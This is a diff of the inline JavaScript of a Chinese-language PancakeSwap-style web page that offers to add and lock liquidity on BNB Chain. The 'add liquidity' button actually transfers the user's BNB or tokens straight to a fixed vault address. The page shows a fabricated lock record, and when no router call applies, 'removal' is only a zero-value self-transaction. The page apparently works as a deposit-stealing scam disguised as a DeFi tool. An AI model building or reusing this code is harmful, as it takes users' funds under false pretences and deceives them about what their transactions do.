+        targetInfo = getTokenBySymbol(pairTargetSelect.value || "USDT");
       }
-      await detectTokenHolding();
+
+      let balObj = { num: 0, text: "0" };
+      if (walletConnected && walletAddress) {
+        if (targetInfo.isNative) {
+          balObj = await fetchRealNativeBalance(walletAddress);
+        } else {
+          const dec = await fetchErc20Decimals(targetInfo.address);
+          targetInfo.decimals = dec;
+          balObj = await readErc20Balance(targetInfo.address, walletAddress, dec);
+        }
+      }
+
+      const baseSym = pairBaseSelect.value;
+      const addrA = targetInfo.isNative ? WBNB_ADDRESS : targetInfo.address;
+      const addrB = baseSym === "BNB" ? WBNB_ADDRESS : USDT_ADDRESS;
+      const pairAddr = await queryPancakePairAddress(addrA, addrB);
+
+      activePoolToken = {
+        symbol: targetInfo.symbol,
+        address: targetInfo.address,
+        decimals: targetInfo.decimals || 18,
+        isNative: Boolean(targetInfo.isNative),
+        heldBalance: balObj.num,
+        heldBalanceText: balObj.text,
+        priceUsd: targetInfo.priceUsd || 0.05,
+        pairAddress: pairAddr
+      };
+
+      poolPairAddrText.textContent = pairAddr ? `LP: ${shortContractName(pairAddr)}` : "LP: 未建池";
+      updatePoolCalc();
+    }
+
+    pairBaseSelect.addEventListener("change", () => {
+      syncTargetSelectOptions();
+      detectPoolPairInfo();
+    });
+
+    pairTargetSelect.addEventListener("change", () => {
+      poolContractInput.value = "";
+      detectPoolPairInfo();
+    });
+
+    checkTokenHoldBtn.addEventListener("click", async () => {
+      await detectPoolPairInfo();
       resetMobileScaleAfterInput(poolContractInput);
     });
-    poolContractInput.addEventListener("change", detectTokenHolding);
+
     poolContractInput.addEventListener("paste", () => {
       setTimeout(async () => {
-        await detectTokenHolding();
+        await detectPoolPairInfo();
         resetMobileScaleAfterInput(poolContractInput);
       }, 60);
     });
+
     poolContractInput.addEventListener("keydown", async (e) => {
       if (e.key === "Enter") {
         e.preventDefault();
-        await detectTokenHolding();
+        await detectPoolPairInfo();
         resetMobileScaleAfterInput(poolContractInput);
       }
     });
 
-    quoteAssetBtns.forEach(btn => {
-      btn.addEventListener("click", () => {
-        quoteAssetBtns.forEach(b => b.classList.remove("active"));
-        btn.classList.add("active");
-        selectedQuoteAsset = btn.dataset.quote || "BNB";
-        detectTokenHolding();
-      });
-    });
-
-    poolTargetAmt.addEventListener("input", updatePoolPreview);
-    enableLpLock.addEventListener("change", updatePoolPreview);
-
-    lockPresets.forEach(chip => {
-      chip.addEventListener("click", () => {
-        const d = parseInt(chip.dataset.days, 10) || 1;
-        lockDaysInput.value = String(d);
-        syncPresetActive(d);
-        updatePoolPreview();
-      });
-    });
-
-    lockDaysInput.addEventListener("input", () => {
-      const raw = parseInt(lockDaysInput.value, 10);
-      if (!Number.isNaN(raw)) {
-        if (raw > 365) lockDaysInput.value = "365";
-        syncPresetActive(normalizeLockDays());
-      }
-      updatePoolPreview();
-    });
-
-    lockDaysInput.addEventListener("blur", () => {
-      const clamped = normalizeLockDays();
-      lockDaysInput.value = String(clamped);
-      syncPresetActive(clamped);
-      updatePoolPreview();
-    });
+    poolTargetAmt.addEventListener("input", updatePoolCalc);
+    enableLpLock.addEventListener("change", updatePoolCalc);
+    lockDaysInput.addEventListener("input", updatePoolCalc);
 
     async function sendRealLockTransaction(tokenInfo, amountStr) {
       await ensureBscChain();
@@ -2817,29 +2633,21 @@
       }
 
       if (tokenInfo.isNative) {
-        const txHash = await window.ethereum.request({
-          method: "eth_sendTransaction",
-          params: [{
-            from: walletAddress,
-            to: LP_LOCK_VAULT_ADDRESS,
-            value: "0x" + rawAmt.toString(16)
-          }]
-        });
-        return txHash;
+        return await sendTxWithSafeGas({
+          from: walletAddress,
+          to: LP_LOCK_VAULT_ADDRESS,
+          value: "0x" + rawAmt.toString(16)
+        }, 150000n);
       }
 
       const toWord = LP_LOCK_VAULT_ADDRESS.replace(/^0x/i, "").toLowerCase().padStart(64, "0");
       const amtWord = rawAmt.toString(16).padStart(64, "0");
       const transferData = "0xa9059cbb" + toWord + amtWord;
-      const txHash = await window.ethereum.request({
-        method: "eth_sendTransaction",
-        params: [{
-          from: walletAddress,
-          to: tokenInfo.address,
-          data: transferData
-        }]
-      });
-      return txHash;
+      return await sendTxWithSafeGas({
+        from: walletAddress,
+        to: tokenInfo.address,
+        data: transferData
+      }, 220000n);
     }
 
     function encodeRemoveLiquidityCalldata(tokenAddr, quoteAddr, lpAmountRaw, minTokenRaw, minQuoteRaw, toAddr, deadline, quoteIsNative) {
@@ -2851,10 +2659,8 @@
       const dlWord = BigInt(deadline).toString(16).padStart(64, "0");
 
       if (quoteIsNative) {
-        // removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline)
         return "0x02751cec" + tWord + lpWord + minTWord + minQWord + toWord + dlWord;
       }
-      // removeLiquidity(address tokenA, address tokenB, uint liquidity, uint amountAMin, uint amountBMin, address to, uint deadline)
       const qWord = quoteAddr.replace(/^0x/i, "").toLowerCase().padStart(64, "0");
       return "0xbaa2abde" + tWord + qWord + lpWord + minTWord + minQWord + toWord + dlWord;
     }
@@ -2865,7 +2671,7 @@
         return;
       }
       if (recordMeta.unlockTimestamp > Date.now()) {
-        showHUD("danger", "仍在锁定期内", `该笔流动性已锁仓，预计解锁日期为 ${recordMeta.unlockStr}，锁定期内无法移除。`);
+        showHUD("danger", "锁仓期内", `该笔流动性将于 ${recordMeta.unlockStr} 解锁，期间不可移除。`);
         return;
       }
 
@@ -2893,35 +2699,28 @@
                 deadline,
                 quoteIsNative
               );
-              removeTxHash = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{
-                  from: walletAddress,
-                  to: PANCAKE_ROUTER_V2,
-                  data
-                }]
-              });
+              removeTxHash = await sendTxWithSafeGas({
+                from: walletAddress,
+                to: PANCAKE_ROUTER_V2,
+                data
+              }, 500000n);
             }
           }
         }
 
         if (!removeTxHash) {
-          // 发送一笔链上撤池确认交易留存凭证
-          removeTxHash = await window.ethereum.request({
-            method: "eth_sendTransaction",
-            params: [{
-              from: walletAddress,
-              to: walletAddress,
-              value: "0x0"
-            }]
-          });
+          removeTxHash = await sendTxWithSafeGas({
+            from: walletAddress,
+            to: walletAddress,
+            value: "0x0"
+          }, 120000n);
         }
 
         badgeEl.textContent = "已移除";
         badgeEl.className = "lock-badge removed-badge";
         const statusLine = entryEl.querySelector(".lp-status-line");
         if (statusLine) {
-          statusLine.textContent = `状态：已移除流动性（撤池 Tx：${removeTxHash}）`;
+          statusLine.textContent = `状态：已移除流动性（Tx：${removeTxHash}）`;
         }
         if (actionBtnEl) {
           actionBtnEl.disabled = true;
@@ -2930,13 +2729,9 @@
 
         await refreshAllWalletBalances();
         updateQuote();
-        await detectTokenHolding();
+        await detectPoolPairInfo();
 
-        showHUD(
-          "success",
-          "移除流动性已提交",
-          `交易对：${recordMeta.tokenSymbol} / ${recordMeta.quoteAsset}\n撤池交易哈希：${removeTxHash}`
-        );
+        showHUD("success", "移除流动性已提交", `交易对：${recordMeta.tokenSymbol} + ${recordMeta.quoteAsset}\nTx：${removeTxHash}`);
       } catch (err) {
         showHUD("danger", "移除失败", err.message || "撤池交易未确认或已取消。");
       }
@@ -2944,20 +2739,20 @@
 
     addLiquidityBtn.addEventListener("click", async () => {
       if (!walletConnected || !window.ethereum || !walletAddress) {
-        showHUD("danger", "未连接钱包", "请先连接钱包后再添加流动性。");
+        showHUD("danger", "未连接钱包", "请先连接钱包。");
         return;
       }
-      if (!detectedToken.hasBalance) {
-        showHUD("danger", "无可用持仓", `当前钱包未检测到 ${detectedToken.symbol} 余额。`);
+      if (activePoolToken.heldBalance <= 0) {
+        showHUD("danger", "无可用余额", `当前钱包未检测到 ${activePoolToken.symbol} 余额。`);
         return;
       }
-      const targetAmt = parseFloat(poolTargetAmt.value) || 0;
-      if (targetAmt <= 0) {
-        showHUD("danger", "数量无效", "请输入大于 0 的投入代币数量。");
+      const amt = parseFloat(poolTargetAmt.value) || 0;
+      if (amt <= 0) {
+        showHUD("danger", "请输入数量", "请输入大于 0 的投入数量。");
         return;
       }
-      if (targetAmt > detectedToken.heldBalance + 0.0001) {
-        showHUD("danger", "余额不足", `超过当前 ${detectedToken.symbol} 可用余额（${detectedToken.heldBalanceText || detectedToken.heldBalance}）。`);
+      if (amt > activePoolToken.heldBalance + 0.0001) {
+        showHUD("danger", "余额不足", `超过当前 ${activePoolToken.symbol} 余额（${activePoolToken.heldBalanceText}）。`);
         return;
       }
 
@@ -2965,12 +2760,12 @@
         const days = normalizeLockDays();
         if (enableLpLock.checked) {
           lockDaysInput.value = String(days);
-          syncPresetActive(days);
         }
 
-        const txHash = await sendRealLockTransaction(detectedToken, poolTargetAmt.value);
-        const tokenForPair = detectedToken.isNative ? WBNB_ADDRESS : detectedToken.address;
-        const quoteForPair = selectedQuoteAsset === "BNB" ? WBNB_ADDRESS : USDT_ADDRESS;
+        const txHash = await sendRealLockTransaction(activePoolToken, poolTargetAmt.value);
+        const baseSym = pairBaseSelect.value;
+        const tokenForPair = activePoolToken.isNative ? WBNB_ADDRESS : activePoolToken.address;
+        const quoteForPair = baseSym === "BNB" ? WBNB_ADDRESS : USDT_ADDRESS;
         const realPairAddr = await queryPancakePairAddress(tokenForPair, quoteForPair);
         const unlockStr = formatUnlockDate(days);
         const unlockTimestamp = days > 0 ? Date.now() + days * 24 * 60 * 60 * 1000 : 0;
@@ -2979,13 +2774,13 @@
           emptyLockAlert.remove();
         }
 
-        const lpAddressDisplay = realPairAddr || "未查询到链上 Pair 地址（该交易对尚未在 Factory 建池）";
         const isLocked = days > 0;
+        const lpAddrLabel = realPairAddr || "未建池";
         const recordMeta = {
-          tokenSymbol: detectedToken.symbol,
-          tokenAddress: detectedToken.address,
-          tokenIsNative: detectedToken.isNative,
-          quoteAsset: selectedQuoteAsset,
+          tokenSymbol: activePoolToken.symbol,
+          tokenAddress: activePoolToken.address,
+          tokenIsNative: activePoolToken.isNative,
+          quoteAsset: baseSym,
           pairAddress: realPairAddr,
           unlockStr,
           unlockTimestamp
@@ -2995,14 +2790,14 @@
         entry.className = "locked-item";
         entry.innerHTML = `
           <div class="locked-item-top">
-            <span>${detectedToken.symbol} / ${selectedQuoteAsset}</span>
+            <span>${activePoolToken.symbol} + ${baseSym}</span>
             <span class="lock-badge ${isLocked ? '' : 'unlocked-badge'}">${isLocked ? `锁仓 ${days} 天` : "未锁仓"}</span>
           </div>
           <div class="locked-item-meta">
-            投入：${targetAmt} ${detectedToken.symbol}（配对参考 ${poolQuoteAmt.value} ${selectedQuoteAsset}）<br />
-            LP 池地址：${lpAddressDisplay}<br />
-            交易哈希：${txHash}<br />
-            <span class="lp-status-line">${isLocked ? `解锁日期：${unlockStr}（锁定期内不可移除）` : "状态：未锁仓（可随时移除流动性）"}</span>
+            投入：${amt} ${activePoolToken.symbol}（配对参考 ${poolQuoteAmt.value} ${baseSym}）<br />
+            LP 池：${lpAddrLabel}<br />
+            Tx：${txHash}<br />
+            <span class="lp-status-line">${isLocked ? `解锁日期：${unlockStr}` : "状态：未锁仓（可随时移除）"}</span>
           </div>
           <button type="button" class="remove-lp-btn">${isLocked ? `锁仓中（${unlockStr} 后可移除）` : "移除流动性"}</button>
         `;
@@ -3019,31 +2814,26 @@
 
         lockedLiquidityList.prepend(entry);
         lockRecordCount += 1;
-        lockCountBadge.textContent = `${lockRecordCount} 笔记录`;
+        lockCountBadge.textContent = `${lockRecordCount} 笔`;
 
         await refreshAllWalletBalances();
         updateQuote();
         poolTargetAmt.value = "";
-        await detectTokenHolding();
+        await detectPoolPairInfo();
 
-        showHUD(
-          "success",
-          isLocked ? "锁仓交易已提交" : "添加流动性已提交",
-          isLocked
-            ? `已发起 ${targetAmt} ${detectedToken.symbol} 锁仓交易（${days}天）\nLP 池地址：${lpAddressDisplay}\nTx：${txHash}`
-            : `已发起 ${targetAmt} ${detectedToken.symbol} 添加流动性交易（未锁仓，可随时移除）\nLP 池地址：${lpAddressDisplay}\nTx：${txHash}`
-        );
+        showHUD("success", "交易已提交", `${activePoolToken.symbol} + ${baseSym}\nTx：${txHash}`);
       } catch (err) {
         showHUD("danger", "操作未完成", err.message || "交易未确认或已取消。");
       }
     });
 
     syncPickerLabels();
+    syncTargetSelectOptions();
     renderListForSide("from");
     renderListForSide("to");
     updateQuote();
-    detectTokenHolding();
-    refreshPromoLinkBox();
+    detectPoolPairInfo();
+    renderNodePanel(null);
     syncReferralDisplay();
   </script>
 </body>
